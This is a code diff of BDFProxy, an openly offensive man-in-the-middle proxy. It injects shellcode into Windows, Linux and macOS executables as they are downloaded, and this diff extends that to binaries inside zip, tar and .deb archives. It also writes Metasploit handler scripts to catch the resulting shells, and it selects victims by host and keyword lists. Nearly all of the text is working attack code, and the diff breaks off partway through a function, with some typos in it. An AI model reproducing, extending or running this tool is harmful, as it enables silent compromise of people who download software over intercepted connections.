@@ -1,26 +1,19 @@
 #!/usr/bin/env python
 """
     BackdoorFactory Proxy (BDFProxy) v0.2 - 'Something Something'
-
     Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-
     Copyright (c) 2013-2014, Joshua Pitts
     All rights reserved.
-
     Redistribution and use in source and binary forms, with or without modification,
     are permitted provided that the following conditions are met:
-
         1. Redistributions of source code must retain the above copyright notice,
         this list of conditions and the following disclaimer.
-
         2. Redistributions in binary form must reproduce the above copyright notice,
         this list of conditions and the following disclaimer in the documentation
         and/or other materials provided with the distribution.
-
         3. Neither the name of the copyright holder nor the names of its contributors
         may be used to endorse or promote products derived from this software without
         specific prior written permission.
-
     THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
     AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
     IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
@@ -32,9 +25,7 @@
     CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
     ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
     POSSIBILITY OF SUCH DAMAGE.
-
     Tested on Kali-Linux.
-
 """
 
 from libmproxy import controller, proxy, platform
@@ -44,28 +35,34 @@ import os
 from bdf import pebin
 from bdf import elfbin
 from bdf import machobin
-import string
-import random
-import zipfile
 import shutil
 import sys
 import pefile
 import logging
-import json
-import tarfile
 import tempfile
+import libarchive
+import magic
+from contextlib import contextmanager
+from configobj import ConfigObj
 
 
-try:
-    from configobj import ConfigObj
-except:
-    print '[!] Install conifgobj using your favorite python package manager!'
+@contextmanager
+def in_dir(dirpath):
+    prev = os.path.abspath(os.getcwd())
+    os.chdir(dirpath)
+    try:
+        yield
+    finally:
+        os.chdir(prev)
 
 
 def writeResource(resourceFile, Values):
     with open(resourceFile, 'w') as f:
         f.write("#USAGE: msfconsole -r thisscriptname.rc\n\n\n")
         writeStatement0 = "use exploit/multi/handler\n"
+        writeStatement1 = ""
+        writeStatement2 = ""
+        writeStatement3 = ""
         writeStatement4 = "set ExitOnSession false\n\n"
         writeStatement5 = "exploit -j -z\n\n"
         for aDictionary in Values:
@@ -100,285 +97,298 @@ def dictParse(d):
 
     resourceValues.append(tmpValues)
 
+def print_size(f):
+    size = len(f) / 1024
+    EnhancedOutput.print_info("File size: {0} KB".format(size))
 
-class proxyMaster(controller.Master):
 
-    def __init__(self, server):
-        controller.Master.__init__(self, server)
-        #FOR FUTURE USE
-        self.binaryMimeTypes = (["application/octet-stream"], ['application/x-msdownload'],
-                                ['application/x-msdos-program'], ['binary/octet-stream'],
-                                )
-        #FOR FUTURE USE
-        self.zipMimeTypes = (['application/x-zip-compressed'], ['application/zip'])
+class EnhancedOutput:
+    @staticmethod
+    def print_error(txt):
+        print "[x] {0}".format(txt)
 
-        #USED NOW
-        self.magicNumbers = {'elf': {'number': '7f454c46'.decode('hex'), 'offset': 0},
-                             'pe': {'number': 'MZ', 'offset': 0},
-                             'gz': {'number': '1f8b'.decode('hex'), 'offset': 0},
-                             'bz': {'number': 'BZ', 'offset': 0},
-                             'zip': {'number': '504b0304'.decode('hex'), 'offset': 0},
-                             'tar': {'number': 'ustar', 'offset': 257},
-                             'fatfile': {'number': 'cafebabe'.decode('hex'), 'offset': 0},
-                             'machox64': {'number': 'cffaedfe'.decode('hex'), 'offset': 0},
-                             'machox86': {'number': 'cefaedfe'.decode('hex'), 'offset': 0},
-                             }
+    @staticmethod
+    def print_info(txt):
+        print "[*] {0}".format(txt)
+
+    @staticmethod
+    def print_warning(txt):
+        print "[!] {0}".format(txt)
+
+    @staticmethod
+    def logging_error(txt):
+        logging.error("[x] Error: {0}".format(txt))
+
+    @staticmethod
+    def logging_warning(txt):
+        logging.warning("[!] Warning: {0}".format(txt))
+
+    @staticmethod
+    def logging_info(txt):
+        logging.info("[*] {0}".format(txt))
+
+    @staticmethod
+    def logging_debug(txt):
+        logging.debug("[.] Debug: {0}".format(txt))
+
+
+class ArchiveType:
+    blacklist = []
+    maxSize = 0
+    patchCount = 0
+
+    def __init__(self, arType):
+        try:
+            userConfig = ConfigObj(CONFIGFILE)
+            self.blacklist = userConfig[arType]['blacklist']
+            self.maxSize = int(userConfig[arType]['maxSize'])
+            self.patchCount = int(userConfig[arType]['patchCount'])
+        except Exception as e:
+            raise Exception("Missing {0}".format(e))
+
+class ProxyMaster(controller.Master):
+    def __init__(self, srv):
+        controller.Master.__init__(self, srv)
+
+        self.binaryMimeType = {'mimes': ['application/octet-stream', 'application/x-msdownload',
+                                'application/x-msdos-program', 'binary/octet-stream',
+                                'application/x-executable', 'application/x-dosexec']}
+
+        self.zipType = {'mimes': ['application/x-zip-compressed', 'application/zip'], 'params': {'type': 'ZIP', 'format': 'zip', 'filter': None}}  # .zip
+
+        self.debType = {'mimes': ['application/x-debian-package', 'application/sarcazzi'], 'params': None}  # .deb
+
+        self.gzType = {'mimes': ['application/gzip', 'application/x-gzip', 'application/gnutar'], 'params': {'type': 'TAR', 'format': 'ustar', 'filter': 'gzip'}}  # .gz
+
+        self.tarType = {'mimes': ['application/x-tar'], 'params': {'type': 'TAR', 'format': 'gnutar', 'filter': None}}  # .tar
+
+        self.bzType = {'mimes': ['application/x-bzip2', 'application/x-bzip'], 'params': {'type': 'TAR', 'format': 'gnutar', 'filter': 'bzip2'}}  # .bz / .bz2
+
+        self.arType = {'mimes': ['application/x-archive'], 'params': {'type': 'AR', 'format': 'ar_bsd', 'filter': None}}  # .ar
+
+        self.xzType = {'mimes': ['application/x-xz'], 'params': {'type': 'LZMA', 'format': 'gnutar', 'filter': 'xz'}}  # .xz
+
+        self.archiveTypes = [self.zipType, self.gzType, self.tarType, self.bzType, self.arType, self.xzType]
+
+        self.patchIT = False
 
     def run(self):
         try:
+            EnhancedOutput.logging_debug("Starting ProxyMaster")
             return controller.Master.run(self)
-            logging.debug("Starting ")
-
         except KeyboardInterrupt:
             self.shutdown()
 
-    def bytes_have_format(self, bytess, formatt):
-        number = self.magicNumbers[formatt]
-        if bytess[number['offset']:number['offset'] + len(number['number'])] == number['number']:
-            return True
-        return False
+    def setConfig(self):
+        try:
+            self.userConfig = ConfigObj(CONFIGFILE)
+            self.host_blacklist = self.userConfig['hosts']['blacklist']
+            self.host_whitelist = self.userConfig['hosts']['whitelist']
+            self.keys_blacklist = self.userConfig['keywords']['blacklist']
+            self.keys_whitelist = self.userConfig['keywords']['whitelist']
+        except Exception as e:
+            EnhancedOutput.print_error("Missing field from config file" + str(e))
 
-    def tar_files(self, aTarFileBytes, formatt):
-        "When called will unpack and edit a Tar File and return a tar file"
+    # archInfo example: {'type':'TAR', 'format':'gnutar', 'filter':'bzip2'}
+    def archive_files(self, archFileBytes, archInfo, include_dirs=False):
 
-        print "[*] TarFile size:", len(aTarFileBytes) / 1024, 'KB'
+        try:
+            archiveType = ArchiveType(archInfo['type'])
+        except Exception as ex:
+            EnhancedOutput.print_error(str(ex))
+            EnhancedOutput.print_warning("Returning original file")
+            EnhancedOutput.logging_error("Error setting archive type: {0}. Returning original file.".format(e))
+            return archFileBytes
 
-        if len(aTarFileBytes) > int(self.userConfig['TAR']['maxSize']):
-            print "[!] TarFile over allowed size"
-            logging.info("TarFIle maxSize met %s", len(aTarFileBytes))
-            return aTarFileBytes
+        print_size(archFileBytes)
 
-        with tempfile.NamedTemporaryFile() as tarFileStorage:
-            tarFileStorage.write(aTarFileBytes)
-            tarFileStorage.flush()
+        if len(archFileBytes) > archiveType.maxSize:
+            EnhancedOutput.print_error("{0} over allowed size".format(archInfo['type']))
+            EnhancedOutput.logging_info("{0} maxSize met {1}".format(archInfo['type'], len(archFileBytes)))
+            return archFileBytes
 
-            if not tarfile.is_tarfile(tarFileStorage.name):
-                print '[!] Not a tar file'
-                return aTarFileBytes
+        tmpDir = tempfile.mkdtemp()
 
-            compressionMode = ':'
-            if formatt == 'gz':
-                compressionMode = ':gz'
-            if formatt == 'bz':
-                compressionMode = ':bz2'
+        try:
+            with in_dir(tmpDir):
+                flags = libarchive.extract.EXTRACT_OWNER | libarchive.extract.EXTRACT_PERM | libarchive.extract.EXTRACT_TIME
+                libarchive.extract_memory(archFileBytes, flags)
+        except Exception as exce:
+            EnhancedOutput.print_error("Can't extract file. Returning original one")
+            EnhancedOutput.logging_error("Can't extract file: {0}. Returning original one.".format(exce))
+            return archFileBytes
 
-            tarFile = None
-            try:
-                tarFileStorage.seek(0)
-                tarFile = tarfile.open(fileobj=tarFileStorage, mode='r' + compressionMode)
-            except tarfile.ReadError:
-                pass
+        EnhancedOutput.print_info("{0} file contents and info".format(archInfo['type']))
+        EnhancedOutput.print_info("Compression: {0}".format(archInfo['filter']))
 
-            if tarFile is None:
-                print '[!] Not a tar file'
-                return aTarFileBytes
+        files_list = list()
+        for dirname, dirnames, filenames in os.walk(tmpDir):
+            dirz = dirname.replace(tmpDir, ".")
+            print "\t{0}".format(dirz)
+            if include_dirs:
+                files_list.append(dirz)
+            for f in filenames:
+                fn = os.path.join(dirz, f)
+                files_list.append(fn)
+                print "\t{0} {1}".format(fn, os.lstat(os.path.join(dirname, f)).st_size)
 
-            print '[*] Tar file contents and info:'
-            print '[*] Compression:', formatt
+        patchCount = 0
+        wasPatched = False
+        tmpArchive = tempfile.NamedTemporaryFile()
 
-            members = tarFile.getmembers()
-            for info in members:
-                print "\t", info.name, info.mtime, info.size
+        try:
+            with libarchive.file_writer(tmpArchive.name, archInfo['format'], archInfo['filter']) as archive:
+                for filename in files_list:
+                    full_path = os.path.join(tmpDir, filename)
+                    EnhancedOutput.print_info(">>> Next file in archive: {0}".format(filename))
 
-            newTarFileStorage = tempfile.NamedTemporaryFile()
-            newTarFile = tarfile.open(mode='w' + compressionMode, fileobj=newTarFileStorage)
+                    if os.path.islink(full_path) or not os.path.isfile(full_path):
+                        EnhancedOutput.print_warning("{0} is not a file, skipping".format(filename))
+                        with in_dir(tmpDir):
+                            archive.add_files(filename)
+                        continue
 
-            patchCount = 0
-            wasPatched = False
+                    if os.lstat(full_path).st_size >= long(self.FileSizeMax):
+                        EnhancedOutput.print_warning("{0} is too big, skipping".format(filename))
+                        with in_dir(tmpDir):
+                            archive.add_files(filename)
+                        continue
 
-            for info in members:
-                print "[*] >>> Next file in tarfile:", info.name
+                    # Check against keywords
+                    keywordCheck = False
 
-                if not info.isfile():
-                    print info.name, 'is not a file'
-                    newTarFile.addfile(info, tarFile.extractfile(info))
-                    continue
-
-                if info.size >= long(self.FileSizeMax):
-                    print info.name, 'is too big'
-                    newTarFile.addfile(info, tarFile.extractfile(info))
-                    continue
-
-                # Check against keywords
-                keywordCheck = False
-
-                if type(self.tarblacklist) is str:
-                    if self.tarblacklist.lower() in info.name.lower():
-                        keywordCheck = True
-
-                else:
-                    for keyword in self.tarblacklist:
-                        if keyword.lower() in info.name.lower():
+                    if type(archiveType.blacklist) is str:
+                        if archiveType.blacklist.lower() in filename.lower():
                             keywordCheck = True
-                            continue
+                    else:
+                        for keyword in archiveType.blacklist:
+                            if keyword.lower() in filename.lower():
+                                keywordCheck = True
+                                continue
 
-                if keywordCheck is True:
-                    print "[!] Tar blacklist enforced!"
-                    logging.info('Tar blacklist enforced on %s', info.name)
-                    continue
+                    if keywordCheck is True:
+                        EnhancedOutput.print_warning("Archive blacklist enforced!")
+                        EnhancedOutput.logging_info('Archive blacklist enforced on {0}'.format(filename))
+                        continue
 
-                # Try to patch
-                extractedFile = tarFile.extractfile(info)
-
-                if patchCount >= int(self.userConfig['TAR']['patchCount']):
-                    newTarFile.addfile(info, extractedFile)
-                else:
-                    # create the file on disk temporarily for fileGrinder to run on it
-                    with tempfile.NamedTemporaryFile() as tmp:
-                        shutil.copyfileobj(extractedFile, tmp)
+                    if patchCount >= archiveType.patchCount:
+                        with in_dir(tmpDir):
+                            archive.add_files(filename)
+                        EnhancedOutput.logging_info("Met archive config patchCount limit. Adding original file")
+                    else:
+                        # create the file on disk temporarily for binaryGrinder to run on it
+                        tmp = tempfile.NamedTemporaryFile()
+                        shutil.copyfile(full_path, tmp.name)
                         tmp.flush()
                         patchResult = self.binaryGrinder(tmp.name)
                         if patchResult:
                             patchCount += 1
-                            file2 = "backdoored/" + os.path.basename(tmp.name)
-                            print "[*] Patching complete, adding to tar file."
-                            info.size = os.stat(file2).st_size
-                            with open(file2, 'rb') as f:
-                                newTarFile.addfile(info, f)
-                            logging.info("%s in tar patched, adding to tarfile", info.name)
+                            file2 = os.path.join(BDFOLDER, os.path.basename(tmp.name))
+                            EnhancedOutput.print_info("Patching complete, adding to archive file.")
+                            shutil.copyfile(file2, full_path)
+                            EnhancedOutput.logging_info("{0} in archive patched, adding to final archive".format(filename))
                             os.remove(file2)
                             wasPatched = True
                         else:
-                            print "[!] Patching failed"
-                            with open(tmp.name, 'rb') as f:
-                                newTarFile.addfile(info, f)
-                            logging.info("%s patching failed. Keeping original file in tar.", info.name)
-                if patchCount == int(self.userConfig['TAR']['patchCount']):
-                    logging.info("Met Tar config patchCount limit.")
+                            EnhancedOutput.print_error("Patching failed")
+                            EnhancedOutput.logging_error("{0} patching failed. Keeping original file.".format(filename))
 
-            # finalize the writing of the tar file first
-            newTarFile.close()
+                        with in_dir(tmpDir):
+                            archive.add_files(filename)
+                        tmp.close()
 
-            # then read the new tar file into memory
-            newTarFileStorage.seek(0)
-            ret = newTarFileStorage.read()
-            newTarFileStorage.close()  # it's automatically deleted
+        except Exception as exc:
+            EnhancedOutput.print_error("Error while creating the archive: {0}. Returning the original file.".format(exc))
+            EnhancedOutput.logging_error("Error while creating the archive: {0}. Returning original file.".format(exc))
+            shutil.rmtree(tmpDir, ignore_errors=True)
+            tmpArchive.close()
+            return archFileBytes
 
-            if wasPatched is False:
-                # If nothing was changed return the original
-                print "[*] No files were patched forwarding original file"
-                return aTarFileBytes
-            else:
-                return ret
 
-    def zip_files(self, aZipFile):
-        "When called will unpack and edit a Zip File and return a zip file"
+        with open(tmpArchive.name, 'r+b') as f:
+            ret = f.read()
+            f.close()
 
-        print "[*] ZipFile size:", len(aZipFile) / 1024, 'KB'
-
-        if len(aZipFile) > int(self.userConfig['ZIP']['maxSize']):
-            print "[!] ZipFile over allowed size"
-            logging.info("ZipFIle maxSize met %s", len(aZipFile))
-            return aZipFile
-
-        tmpRan = ''.join(random.choice(string.ascii_lowercase + string.digits + string.ascii_uppercase) for _ in range(8))
-        tmpDir = '/tmp/' + tmpRan
-        tmpFile = '/tmp/' + tmpRan + '.zip'
-
-        os.mkdir(tmpDir)
-
-        with open(tmpFile, 'w') as f:
-            f.write(aZipFile)
-
-        zippyfile = zipfile.ZipFile(tmpFile, 'r')
-
-        #encryption test
-        try:
-            zippyfile.testzip()
-
-        except RuntimeError as e:
-            if 'encrypted' in str(e):
-                logging.info('Encrypted zipfile found. Not patching.')
-                return aZipFile
-
-        print "[*] ZipFile contents and info:"
-
-        for info in zippyfile.infolist():
-            print "\t", info.filename, info.date_time, info.file_size
-
-        zippyfile.extractall(tmpDir)
-
-        patchCount = 0
-
-        wasPatched = False
-
-        for info in zippyfile.infolist():
-            print "[*] >>> Next file in zipfile:", info.filename
-
-            if os.path.isdir(tmpDir + '/' + info.filename) is True:
-                print info.filename, 'is a directory'
-                continue
-
-            #Check against keywords
-            keywordCheck = False
-
-            if type(self.zipblacklist) is str:
-                if self.zipblacklist.lower() in info.filename.lower():
-                    keywordCheck = True
-
-            else:
-                for keyword in self.zipblacklist:
-                    if keyword.lower() in info.filename.lower():
-                        keywordCheck = True
-                        continue
-
-            if keywordCheck is True:
-                print "[!] Zip blacklist enforced!"
-                logging.info('Zip blacklist enforced on %s', info.filename)
-                continue
-
-            patchResult = self.binaryGrinder(tmpDir + '/' + info.filename)
-
-            if patchResult:
-                patchCount += 1
-                file2 = "backdoored/" + os.path.basename(info.filename)
-                print "[*] Patching complete, adding to zip file."
-                shutil.copyfile(file2, tmpDir + '/' + info.filename)
-                logging.info("%s in zip patched, adding to zipfile", info.filename)
-                os.remove(file2)
-                wasPatched = True
-            else:
-                print "[!] Patching failed"
-                logging.info("%s patching failed. Keeping original file in zip.", info.filename)
-
-            print '-' * 10
-
-            if patchCount >= int(self.userConfig['ZIP']['patchCount']):  # Make this a setting.
-                logging.info("Met Zip config patchCount limit.")
-                break
-
-        zippyfile.close()
-
-        zipResult = zipfile.ZipFile(tmpFile, 'w', zipfile.ZIP_DEFLATED)
-
-        print "[*] Writing to zipfile:", tmpFile
-
-        for base, dirs, files in os.walk(tmpDir):
-            for afile in files:
-                    filename = os.path.join(base, afile)
-                    print '[*] Writing filename to zipfile:', filename.replace(tmpDir + '/', '')
-                    zipResult.write(filename, arcname=filename.replace(tmpDir + '/', ''))
-
-        zipResult.close()
-        #clean up
-        shutil.rmtree(tmpDir)
-
-        with open(tmpFile, 'rb') as f:
-            tempZipFile = f.read()
-        os.remove(tmpFile)
+        # cleanup
+        shutil.rmtree(tmpDir, ignore_errors=True)
+        tmpArchive.close()
 
         if wasPatched is False:
-            print "[*] No files were patched forwarding original file"
-            return aZipFile
+            EnhancedOutput.print_info("No files were patched. Forwarding original file")
+            return archFileBytes
         else:
-            return tempZipFile
+            return ret
 
-    def convert_to_Bool(self, aString):
-        if aString.lower() == 'true':
+    def deb_files(self, debFile):
+        try:
+            archiveType = ArchiveType('AR')
+        except Exception as e:
+            EnhancedOutput.print_error(str(e))
+            EnhancedOutput.print_warning("Returning original file")
+            EnhancedOutput.logging_error("Error setting archive type: {0}. Returning original file.".format(e))
+            return debFile
+
+        print_size(debFile)
+
+        if len(debFile) > archiveType.maxSize:
+            EnhancedOutput.print_error("AR File over allowed size")
+            EnhancedOutput.logging_info("AR File maxSize met {0}".format(len(debFile)))
+            return debFile
+
+        tmpDir = tempfile.mkdtemp()
+
+        # first: save the stream to a local file
+        tmpFile = tempfile.NamedTemporaryFile()
+        tmpFile.write(debFile)
+        tmpFile.seek(0)
+
+        # chdir to the tmpDir which the new ar file resides
+        # and extract it so work on the 'copy' of the stream
+        with in_dir(tmpDir):
+            libarchive.extract_file(tmpFile.name)
+
+        file2inject = 'data.tar.gz'
+        infoz = {'type': 'TAR', 'format': 'ustar', 'filter': 'gzip'}
+
+        if os.path.exists(os.path.join(tmpDir, 'data.tar.xz')):
+            file2inject = 'data.tar.xz'
+            infoz = {'type': 'LZMA', 'format': 'gnutar', 'filter': 'xz'}
+
+        EnhancedOutput.print_info("Patching {0}".format(file2inject))
+        # recreate the injected archive
+        with open(os.path.join(tmpDir, file2inject), 'r+b') as f:
+            bfz = f.read()
+            f.seek(0)
+            f.write(self.archive_files(bfz, infoz, include_dirs=True))
+            f.flush()
+            f.close()
+
+        blk = []
+
+        def write_data(data):
+            blk.append(data[:])
+            return len(data[:])
+
+        with libarchive.custom_writer(write_data, 'ar_bsd') as archive:
+            archive.add_files(os.path.join(tmpDir, 'debian-binary'))
+            archive.add_files(os.path.join(tmpDir, 'control.tar.gz'))
+            archive.add_files(os.path.join(tmpDir, file2inject))
+
+        buf = b''.join(blk)
+
+        # clean up
+        shutil.rmtree(tmpDir, ignore_errors=True)
+        tmpFile.close()
+
+        return buf
+
+
+    def str2bool(self, val):
+        if val.lower() == 'true':
             return True
-        elif aString.lower() == 'false':
+        elif val.lower() == 'false':
             return False
-        elif aString.lower() == 'none':
+        else:
             return None
 
     def binaryGrinder(self, binaryFile):
@@ -386,7 +396,6 @@ class proxyMaster(controller.Master):
         Feed potential binaries into this function,
         it will return the result PatchedBinary, False, or None
         """
-
         with open(binaryFile, 'r+b') as f:
             binaryTMPHandle = f.read()
 
@@ -399,66 +408,66 @@ class proxyMaster(controller.Master):
                 magic = pe.OPTIONAL_HEADER.Magic
                 machineType = pe.FILE_HEADER.Machine
 
-                #update when supporting more than one arch
+                # update when supporting more than one arch
                 if (magic == int('20B', 16) and machineType == 0x8664 and
-                   self.WindowsType.lower() in ['all', 'x64']):
-                        add_section = False
-                        cave_jumping = False
-                        if self.WindowsIntelx64['PATCH_TYPE'].lower() == 'append':
-                            add_section = True
-                        elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
-                            cave_jumping = True
+                            self.WindowsType.lower() in ['all', 'x64']):
+                    add_section = False
+                    cave_jumping = False
+                    if self.WindowsIntelx64['PATCH_TYPE'].lower() == 'append':
+                        add_section = True
+                    elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
+                        cave_jumping = True
 
-                        # if automatic override
-                        if self.WindowsIntelx64['PATCH_METHOD'].lower() == 'automatic':
-                            cave_jumping = True
+                    # if automatic override
+                    if self.WindowsIntelx64['PATCH_METHOD'].lower() == 'automatic':
+                        cave_jumping = True
 
-                        targetFile = pebin.pebin(FILE=binaryFile,
-                                                 OUTPUT=os.path.basename(binaryFile),
-                                                 SHELL=self.WindowsIntelx64['SHELL'],
-                                                 HOST=self.WindowsIntelx64['HOST'],
-                                                 PORT=int(self.WindowsIntelx64['PORT']),
-                                                 ADD_SECTION=add_section,
-                                                 CAVE_JUMPING=cave_jumping,
-                                                 IMAGE_TYPE=self.WindowsType,
-                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx64['PATCH_DLL']),
-                                                 SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
-                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx64['ZERO_CERT']),
-                                                 PATCH_METHOD=self.WindowsIntelx64['PATCH_METHOD'].lower()
-                                                 )
+                    targetFile = pebin.pebin(FILE=binaryFile,
+                                             OUTPUT=os.path.basename(binaryFile),
+                                             SHELL=self.WindowsIntelx64['SHELL'],
+                                             HOST=self.WindowsIntelx64['HOST'],
+                                             PORT=int(self.WindowsIntelx64['PORT']),
+                                             ADD_SECTION=add_section,
+                                             CAVE_JUMPING=cave_jumping,
+                                             IMAGE_TYPE=self.WindowsType,
+                                             PATCH_DLL=self.str2bool(self.WindowsIntelx64['PATCH_DLL']),
+                                             SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
+                                             ZERO_CERT=self.str2bool(self.WindowsIntelx64['ZERO_CERT']),
+                                             PATCH_METHOD=self.WindowsIntelx64['PATCH_METHOD'].lower()
+                                             )
 
-                        result = targetFile.run_this()
+                    result = targetFile.run_this()
 
                 elif (machineType == 0x14c and
-                      self.WindowsType.lower() in ['all', 'x86']):
-                        add_section = False
-                        cave_jumping = False
-                        #add_section wins for cave_jumping
-                        #default is single for BDF
-                        if self.WindowsIntelx86['PATCH_TYPE'].lower() == 'append':
-                            add_section = True
-                        elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
-                            cave_jumping = True
+                              self.WindowsType.lower() in ['all', 'x86']):
+                    add_section = False
+                    cave_jumping = False
+                    # add_section wins for cave_jumping
+                    # default is single for BDF
+                    if self.WindowsIntelx86['PATCH_TYPE'].lower() == 'append':
+                        add_section = True
+                    elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
+                        cave_jumping = True
 
-                        # if automatic override
-                        if self.WindowsIntelx86['PATCH_METHOD'].lower() == 'automatic':
-                            cave_jumping = True
+                    # if automatic override
+                    if self.WindowsIntelx86['PATCH_METHOD'].lower() == 'automatic':
+                        cave_jumping = True
 
-                        targetFile = pebin.pebin(FILE=binaryFile,
-                                                 OUTPUT=os.path.basename(binaryFile),
-                                                 SHELL=self.WindowsIntelx86['SHELL'],
-                                                 HOST=self.WindowsIntelx86['HOST'],
-                                                 PORT=int(self.WindowsIntelx86['PORT']),
-                                                 ADD_SECTION=add_section,
-                                                 CAVE_JUMPING=cave_jumping,
-                                                 IMAGE_TYPE=self.WindowsType,
-                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx86['PATCH_DLL']),
-                                                 SUPPLIED_SHELLCODE=self.WindowsIntelx86['SUPPLIED_SHELLCODE'],
-                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx86['ZERO_CERT']),
-                                                 PATCH_METHOD=self.WindowsIntelx86['PATCH_METHOD'].lower()
-                                                 )
+                    targetFile = pebin.pebin(FILE=binaryFile,
+                                             OUTPUT=os.path.basename(binaryFile),
+                                             SHELL=self.WindowsIntelx86['SHELL'],
+                                             HOST=self.WindowsIntelx86['HOST'],
+                                             PORT=int(self.WindowsIntelx86['PORT']),
+                                             ADD_SECTION=add_section,
+                                             CAVE_JUMPING=cave_jumping,
+                                             IMAGE_TYPE=self.WindowsType,
+                                             PATCH_DLL=self.str2bool(self.WindowsIntelx86['PATCH_DLL']),
+                                             SUPPLIED_SHELLCODE=self.WindowsIntelx86['SUPPLIED_SHELLCODE'],
+                                             ZERO_CERT=self.str2bool(self.WindowsIntelx86['ZERO_CERT']),
+                                             PATCH_METHOD=self.WindowsIntelx86['PATCH_METHOD'].lower()
+                                             )
 
-                        result = targetFile.run_this()
+                    result = targetFile.run_this()
 
             elif binaryHeader[:4].encode('hex') == '7f454c46':  # ELF
 
@@ -466,7 +475,7 @@ class proxyMaster(controller.Master):
                 targetFile.support_check()
 
                 if targetFile.class_type == 0x1:
-                    #x86CPU Type
+                    # x86CPU Type
                     targetFile = elfbin.elfbin(FILE=binaryFile,
                                                OUTPUT=os.path.basename(binaryFile),
                                                SHELL=self.LinuxIntelx86['SHELL'],
@@ -477,7 +486,7 @@ class proxyMaster(controller.Master):
                                                )
                     result = targetFile.run_this()
                 elif targetFile.class_type == 0x2:
-                    #x64
+                    # x64
                     targetFile = elfbin.elfbin(FILE=binaryFile,
                                                OUTPUT=os.path.basename(binaryFile),
                                                SHELL=self.LinuxIntelx64['SHELL'],
@@ -492,7 +501,7 @@ class proxyMaster(controller.Master):
                 targetFile = machobin.machobin(FILE=binaryFile, SUPPORT_CHECK=False)
                 targetFile.support_check()
 
-                #ONE CHIP SET MUST HAVE PRIORITY in FAT FILE
+                # ONE CHIP SET MUST HAVE PRIORITY in FAT FILE
 
                 if targetFile.FAT_FILE is True:
                     if self.FatPriority == 'x86':
@@ -542,258 +551,201 @@ class proxyMaster(controller.Master):
             return result
 
         except Exception as e:
-            print 'Exception', str(e)
-            logging.warning("EXCEPTION IN binaryGrinder %s", str(e))
+            EnhancedOutput.print_error('binaryGrinder: {0}'.format(e))
+            EnhancedOutput.logging_warning("Exception in binaryGrinder {0}".format(e))
             return None
 
     def hosts_whitelist_check(self, flow):
-        if self.hostwhitelist.lower() == 'all':
+        if self.host_whitelist.lower() == 'all':
             self.patchIT = True
 
-        elif type(self.hostwhitelist) is str:
-            if self.hostwhitelist.lower() in flow.request.host.lower():
+        elif type(self.host_whitelist) is str:
+            if self.host_whitelist.lower() in flow.request.host.lower():
                 self.patchIT = True
-                logging.info("Host whitelist hit: %s, HOST: %s ",
-                             str(self.hostwhitelist),
-                             str(flow.request.host),
-                             )
-
-        elif flow.request.host.lower() in self.hostwhitelist.lower():
+                EnhancedOutput.logging_info("Host whitelist hit: {0}, HOST: {1}".format(self.host_whitelist, flow.request.host))
+        elif flow.request.host.lower() in self.host_whitelist.lower():
             self.patchIT = True
-            logging.info("Host whitelist hit: %s, HOST: %s ",
-                         str(self.hostwhitelist),
-                         str(flow.request.host),
-                         )
-
+            EnhancedOutput.logging_info("Host whitelist hit: {0}, HOST: {1} ".format(self.host_whitelist, flow.request.host))
         else:
-            for keyword in self.hostwhitelist:
+            for keyword in self.host_whitelist:
                 if keyword.lower() in flow.requeset.host.lower():
                     self.patchIT = True
-                    logging.info("Host whitelist hit: %s, HOST: %s ",
-                                 str(self.hostwhitelist),
-                                 str(flow.request.host),
-                                 )
+                    EnhancedOutput.logging_info("Host whitelist hit: {0}, HOST: {1} ".format(self.host_whitelist, flow.request.host))
                     break
 
     def keys_whitelist_check(self, flow):
-        #Host whitelist check takes precedence
+        # Host whitelist check takes precedence
         if self.patchIT is False:
             return None
 
-        if self.keyswhitelist.lower() == 'all':
+        if self.keys_whitelist.lower() == 'all':
             self.patchIT = True
-
-        elif type(self.keyswhitelist) is str:
-            if self.keyswhitelist.lower() in flow.request.path.lower():
+        elif type(self.keys_whitelist) is str:
+            if self.keys_whitelist.lower() in flow.request.path.lower():
                 self.patchIT = True
-                logging.info("Keyword whitelist hit: %s, PATH: %s",
-                             str(self.keyswhitelist), str(flow.request.path))
-
-        elif flow.request.host.lower() in [x.lower() for x in self.keyswhitelist]:
+                EnhancedOutput.logging_info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, flow.request.path))
+        elif flow.request.host.lower() in [x.lower() for x in self.keys_whitelist]:
             self.patchIT = True
-            logging.info("Keyword whitelist hit: %s, PATH: %s",
-                         str(self.keyswhitelist), str(flow.request.path))
-
+            EnhancedOutput.logging_info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, flow.request.path))
         else:
-
-            for keyword in self.keyswhitelist:
+            for keyword in self.keys_whitelist:
                 if keyword.lower() in flow.requeset.path.lower():
                     self.patchIT = True
-                    logging.info("Keyword whitelist hit: %s, PATH: %s",
-                                 str(self.keyswhitelist), str(flow.request.path))
+                    EnhancedOutput.logging_info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, flow.request.path))
                     break
 
     def keys_backlist_check(self, flow):
-        if type(self.keysblacklist) is str:
-
-            if self.keysblacklist.lower() in flow.request.path.lower():
+        if type(self.keys_blacklist) is str:
+            if self.keys_blacklist.lower() in flow.request.path.lower():
                 self.patchIT = False
-                logging.info("Keyword blacklist hit: %s, PATH: %s",
-                             str(self.keysblacklist), str(flow.request.path))
-
+                EnhancedOutput.logging_info("Keyword blacklist hit: {0}, PATH: {1}".format(self.keys_blacklist, flow.request.path))
         else:
